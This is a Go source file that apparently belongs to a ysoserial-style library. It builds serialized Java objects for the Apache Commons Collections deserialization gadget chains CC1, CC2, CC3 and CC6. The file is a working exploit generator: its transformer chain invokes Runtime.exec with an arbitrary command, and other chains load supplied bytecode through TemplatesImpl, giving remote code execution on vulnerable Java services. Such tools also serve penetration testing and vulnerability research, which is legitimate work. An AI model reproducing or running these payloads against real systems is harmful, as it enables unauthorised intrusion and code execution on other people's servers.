package serlib

import (
	"goserja/java"
	"goserja/rt"
	"strings"
)

/**
java反序列化漏洞 cc链实现
*/
//是否为cc4版本依赖
var JarVersion4 = false

func Cc1(cmd string) java.Object {
	chainedTransformer := NewTransformerArr(cmd)
	hashMap := rt.NewJHashMap()
	hashMap.Put("value", randomName(1))
	lazyMap := LazyMapDecorate(hashMap, chainedTransformer)
	TargetClass := java.Class{
		Name:       "java.lang.annotation.Target",
		Implements: make([]java.Interface, 0),
		Fields:     make([]java.Field, 0),
	}
	handler := NewAnnotationInvocationHandler(TargetClass, lazyMap)
	proxyMap := java.NewProxyObject(handler, []Interface{java.Map})
	return NewAnnotationInvocationHandler(TargetClass, *proxyMap)
}

// Cc2 cc2链序列化对象构建
func Cc2(bytecode []byte) java.Object {
	JarVersion4 = true
	temples := NewTemplesImpl(randomName(5), bytecode)
	invokerTransformer := NewInvokerTransformer("newTransformer", []java.Class{}, []java.Object{})
	class := loadClass("org.apache.commons.collections4.comparators.TransformingComparator")
	transformingComparator := class.NewInstance(loader)
	transformingComparator.Fields["transformer"] = invokerTransformer

	queue := rt.NewJPriorityQueue()
	queue.Add(temples)
	queue.Add(temples)
	queue.SetComparator(transformingComparator)
	JarVersion4 = false
	return queue.Object
}

// Cc3 cc3链序列化对象构建
func Cc3(bytecode []byte) java.Object {
	temples := NewTemplesImpl(randomName(5), bytecode)
	transformers := make([]java.Object, 2)
	transformers[0] = NewConstantTransformer(temples)
	transformers[1] = NewInvokerTransformer("newTransformer", []java.Class{}, []java.Object{})
	chainedTransformer := NewChainedTransformer(transformers)
	hashMap := rt.NewJHashMap()
	hashMap.Put("value", randomName(1))
	decorateMap := TransformedMapDecorate(hashMap, java.NULL, chainedTransformer)
	TargetClass := java.Class{
		Name:       "java.lang.annotation.Target",
		Implements: make([]java.Interface, 0),
		Fields:     make([]java.Field, 0),
	}
	return NewAnnotationInvocationHandler(TargetClass, decorateMap)
}

// Cc6 cc6链序列化对象构建
func Cc6(cmd string) java.Object {
	chainedTransformer := NewTransformerArr(cmd)
	/*
		HashMap<Object,Object> hashMap= new HashMap<>();
		Map<Object,Object> lazyMap= LazyMap.decorate(hashMap,new ConstantTransformer(1));
		TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"aaa");
		chainedTransformer := NewTransformerArr(cmd)
	*/

	hashMap := rt.NewJHashMap()
	lazyMap := LazyMapDecorate(hashMap, chainedTransformer)
	tiedMapEntry := NewTiedMapEntry(lazyMap, java.NewString("a"))
	map2 := rt.NewJHashMap()
	map2.Put(tiedMapEntry, "s")
	return map2.Object
}

// 创建Transformer数组命令执行
func NewTransformerArr(cmd string) java.Object {
	/*
		Transformer[] transformers=new Transformer[]{
		new ConstantTransformer(Runtime.class),
		new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
		new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
		new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
		};
	*/
	transformers := make([]java.Object, 4)
	transformers[0] = NewConstantTransformer(java.RuntimeClass)
	transformers[1] = NewInvokerTransformer("getMethod", []Class{java.StringClass, java.ClassArrayClass}, []java.Object{java.NewString("getRuntime"), java.NULL})
	transformers[2] = NewInvokerTransformer("invoke", []Class{java.ObjectClass, java.ObjectArrayClass}, []java.Object{java.NULL, java.NULL})
	transformers[3] = NewInvokerTransformer("exec", []Class{java.StringClass}, []java.Object{java.NewString(cmd)})
	// ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
	return NewChainedTransformer(transformers)
}

func NewConstantTransformer(val interface{}) java.Object {
	// new ConstantTransformer(Runtime.class)
	class := loadClass("org.apache.commons.collections.functors.ConstantTransformer")
	class = sureVersion(class)
	i := class.NewInstance(loader)
	i.Fields["iConstant"] = val
	return i
}

func NewInvokerTransformer(methodName string, argClasses []java.Class, args []java.Object) java.Object {
	//new InvokerTransformer(...)
	class := loadClass("org.apache.commons.collections.functors.InvokerTransformer")
	class = sureVersion(class)
	transformer := class.NewInstance(AppClassLoader)
	transformer.Fields["iMethodName"] = methodName
	transformer.Fields["iParamTypes"] = argClasses
	transformer.Fields["iArgs"] = args
	return transformer
}

func LazyMapDecorate(hashMap rt.HashMap, factory java.Object) java.Object {
	class := loadClass("org.apache.commons.collections.map.LazyMap")
	class = sureVersion(class)
	lazyMap := class.NewInstance(loader)
	lazyMap.Fields["factory"] = factory
	lazyMap.Fields["map"] = hashMap.Object
	return lazyMap
}

func NewTiedMapEntry(hashMap java.Object, key java.Object) java.Object {
	class := loadClass("org.apache.commons.collections.keyvalue.TiedMapEntry")
	class = sureVersion(class)
	tiedMapEntry := class.NewInstance(loader)
	tiedMapEntry.Fields["map"] = hashMap
	tiedMapEntry.Fields["key"] = key
	return tiedMapEntry
}

func NewChainedTransformer(iTransformers []java.Object) java.Object {
	class := loadClass("org.apache.commons.collections.functors.ChainedTransformer")
	class = sureVersion(class)
	chainedTransformer := class.NewInstance(loader)
	chainedTransformer.Fields["iTransformers"] = iTransformers
	return chainedTransformer
}

func TransformedMapDecorate(hashMap rt.HashMap, key, value java.Object) java.Object {
	class := loadClass("org.apache.commons.collections.map.TransformedMap")
	class = sureVersion(class)
	transformedMap := class.NewInstance(loader)
	transformedMap.Fields["map"] = hashMap.Object
	transformedMap.Fields["keyTransformer"] = key
	transformedMap.Fields["valueTransformer"] = value
	return transformedMap
}

func NewAnnotationInvocationHandler(typeClass java.Class, mapVal java.Object) java.Object {
	o := java.AnnotationInvocationHandlerClass.NewInstance(nil)
	o.Fields["type"] = typeClass
	o.Fields["memberValues"] = mapVal
	return o
}

func sureVersion(class *java.Class) *java.Class {
	if JarVersion4 {
		//修改包名
		class.Name = strings.ReplaceAll(class.Name, "collections", "collections4")
		for _, field := range class.Fields {
			field.Descriptor = strings.ReplaceAll(field.Descriptor, "collections", "collections4")
		}
		loader.RegisterClass(*class)
		return class
	}
	return class
}
